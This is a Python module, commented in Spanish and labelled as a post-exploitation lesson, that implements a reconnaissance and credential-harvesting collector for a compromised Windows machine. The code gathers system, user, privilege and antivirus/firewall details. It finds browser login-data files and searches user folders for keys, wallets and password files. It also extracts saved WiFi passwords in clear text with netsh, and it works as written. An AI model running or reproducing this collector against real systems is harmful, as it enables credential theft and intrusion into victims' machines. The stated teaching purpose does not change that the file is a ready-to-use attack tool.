"""
Módulo de recopilación de inteligencia - Reconocimiento del sistema
Propósito: Entender técnicas de reconocimiento post-explotación
"""

import os
import sys
import json
import socket
import platform
import subprocess
from datetime import datetime
from pathlib import Path


class IntelligenceCollector:
    """
    Clase 3: Recopilación de información del sistema comprometido
    """
    
    def __init__(self):
        self.data = {}
        self.sensitive_files = []
    
    def collect_all(self):
        """
        Recopila toda la información disponible
        """
        self.data = {
            'system': self._get_system_info(),
            'network': self._get_network_info(),
            'user': self._get_user_info(),
            'hardware': self._get_hardware_info(),
            'software': self._get_software_info(),
            'security': self._get_security_info(),
            'browser': self._get_browser_info(),
            'files': self._find_sensitive_files(),
            'wifi': self._get_wifi_passwords(),
            'timestamp': datetime.now().isoformat()
        }
        return self.data
    
    def _get_system_info(self):
        """Información del sistema operativo"""
        return {
            'platform': platform.platform(),
            'version': platform.version(),
            'architecture': platform.architecture(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'node': platform.node(),
            'boot_time': self._get_boot_time(),
            'install_date': self._get_install_date()
        }
    
    def _get_network_info(self):
        """Información de red"""
        info = {
            'hostname': socket.gethostname(),
            'fqdn': socket.getfqdn(),
            'interfaces': []
        }
        
        try:
            import psutil
            interfaces = psutil.net_if_addrs()
            for name, addresses in interfaces.items():
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        info['interfaces'].append({
                            'name': name,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
        except:
            pass
        
        # IP pública
        try:
            import urllib.request
            with urllib.request.urlopen(
                'https://api.ipify.org?format=json', 
                timeout=5
            ) as response:
                info['public_ip'] = json.loads(response.read())['ip']
        except:
            info['public_ip'] = 'unknown'
        
        return info
    
    def _get_user_info(self):
        """Información del usuario"""
        return {
            'username': os.getenv('USERNAME'),
            'userdomain': os.getenv('USERDOMAIN'),
            'userprofile': os.getenv('USERPROFILE'),
            'appdata': os.getenv('APPDATA'),
            'localappdata': os.getenv('LOCALAPPDATA'),
            'temp': os.getenv('TEMP'),
            'homepath': os.getenv('HOMEPATH'),
            'homedrive': os.getenv('HOMEDRIVE'),
            'is_admin': self._is_admin(),
            'privileges': self._get_privileges()
        }
    
    def _is_admin(self):
        """Verifica si tiene privilegios de administrador"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _get_privileges(self):
        """Lista privilegios actuales"""
        privileges = []
        try:
            output = subprocess.run(
                ['whoami', '/priv'], 
                capture_output=True, 
                text=True
            ).stdout
            # Parsear salida
        except:
            pass
        return privileges
    
    def _get_hardware_info(self):
        """Información del hardware"""
        info = {}
        try:
            import psutil
            info['cpu'] = {
                'cores': psutil.cpu_count(logical=False),
                'threads': psutil.cpu_count(logical=True),
                'freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
            }
            info['memory'] = {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available
            }
            info['disk'] = []
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    info['disk'].append({
                        'device': part.device,
                        'mountpoint': part.mountpoint,
                        'fstype': part.fstype,
                        'total': usage.total,
                        'used': usage.used
                    })
                except:
                    pass
        except:
            pass
        return info
    
    def _get_software_info(self):
        """Software instalado"""
        software = []
        try:
            # Query WMI para software instalado
            output = subprocess.run([
                'wmic', 'product', 'get', 'name,version,vendor',
                '/format:csv'
            ], capture_output=True, text=True).stdout
            
            for line in output.split('\n')[2:]:  # Skip headers
                if line.strip():
                    parts = line.strip().split(',')
                    if len(parts) >= 3:
                        software.append({
                            'name': parts[1] if len(parts) > 1 else '',
                            'version': parts[2] if len(parts) > 2 else '',
                            'vendor': parts[3] if len(parts) > 3 else ''
                        })
        except:
            pass
        return software
    
    def _get_security_info(self):
        """Información de seguridad (AV, firewall)"""
        info = {
            'antivirus': [],
            'firewall_status': None,
            'uac_status': None
        }
        
        # Detectar AV
        try:
            output = subprocess.run([
                'wmic', '/namespace:\\root\\securitycenter2',
                'path', 'antivirusproduct', 'get', 'displayname'
            ], capture_output=True, text=True).stdout
            
            for line in output.split('\n')[1:]:
                if line.strip():
                    info['antivirus'].append(line.strip())
        except:
            pass
        
        # Estado del firewall
        try:
            output = subprocess.run([
                'netsh', 'advfirewall', 'show', 'currentprofile'
            ], capture_output=True, text=True).stdout
            info['firewall_status'] = 'enabled' if 'ON' in output else 'disabled'
        except:
            pass
        
        return info
    
    def _get_browser_info(self):
        """Información de navegadores"""
        browsers = {}
        
        # Chrome
        local_app_data = os.getenv('LOCALAPPDATA', '')
        app_data = os.getenv('APPDATA', '')
        
        if local_app_data:
            chrome_path = os.path.join(
                local_app_data,
                r'Google\Chrome\User Data\Default'
            )
            if os.path.exists(chrome_path):
                browsers['chrome'] = {
                    'path': chrome_path,
                    'history': os.path.join(chrome_path, 'History'),
                    'bookmarks': os.path.join(chrome_path, 'Bookmarks'),
                    'login_data': os.path.join(chrome_path, 'Login Data')
                }
        
        # Firefox
        if app_data:
            firefox_path = os.path.join(
                app_data,
                r'Mozilla\Firefox\Profiles'
            )
            if os.path.exists(firefox_path):
                browsers['firefox'] = {
                    'path': firefox_path
                }
        
        # Edge
        if local_app_data:
            edge_path = os.path.join(
                local_app_data,
                r'Microsoft\Edge\User Data\Default'
            )
            if os.path.exists(edge_path):
                browsers['edge'] = {
                    'path': edge_path
                }
        
        return browsers
    
    def _find_sensitive_files(self):
        """Busca archivos potencialmente sensibles"""
        patterns = [
            '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx',
            '*.txt', '*.key', '*.pem', '*.ppk', '*.json',
            'wallet*', 'password*', 'secret*', 'backup*'
        ]
        
        user_profile = os.getenv('USERPROFILE', '')
        app_data = os.getenv('APPDATA', '')
        
        locations = []
        if user_profile:
            locations.extend([
                os.path.join(user_profile, 'Documents'),
                os.path.join(user_profile, 'Desktop'),
                os.path.join(user_profile, 'Downloads'),
            ])
        if app_data:
            locations.append(app_data)
        
        files = []
        for location in locations:
            if os.path.exists(location):
                try:
                    for pattern in patterns:
                        found = list(Path(location).rglob(pattern))
                        files.extend([str(f) for f in found[:10]])
                except:
                    pass
        
        return files[:50]  # Limitar cantidad
    
    def _get_wifi_passwords(self):
        """Extrae contraseñas WiFi guardadas"""
        networks = []
        try:
            # Obtener perfiles
            output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True
            ).stdout
            
            profiles = []
            for line in output.split('\n'):
                if 'Perfil de todos los usuarios' in line or 'All User Profile' in line:
                    profile = line.split(':')[1].strip()
                    profiles.append(profile)
            
            # Obtener contraseñas
            for profile in profiles:
                try:
                    output = subprocess.run([
                        'netsh', 'wlan', 'show', 'profile',
                        profile, 'key=clear'
                    ], capture_output=True, text=True).stdout
                    
                    for line in output.split('\n'):
                        if 'Contenido de la clave' in line or 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            networks.append({
                                'ssid': profile,
                                'password': password
                            })
                except:
                    pass
        except:
            pass
        
        return networks
    
    def _get_boot_time(self):
        """Tiempo desde el arranque"""
        try:
            import psutil
            from datetime import datetime
            return datetime.fromtimestamp(
                psutil.boot_time()
            ).isoformat()
        except:
            return None
    
    def _get_install_date(self):
        """Fecha de instalación del sistema"""
        try:
            output = subprocess.run([
                'wmic', 'os', 'get', 'installdate', '/value'
            ], capture_output=True, text=True).stdout
            
            for line in output.split('\n'):
                if 'InstallDate=' in line:
                    return line.split('=')[1].strip()
        except:
            return None
    
    def to_json(self):
        """Exporta a JSON"""
        return json.dumps(self.data, indent=2, default=str)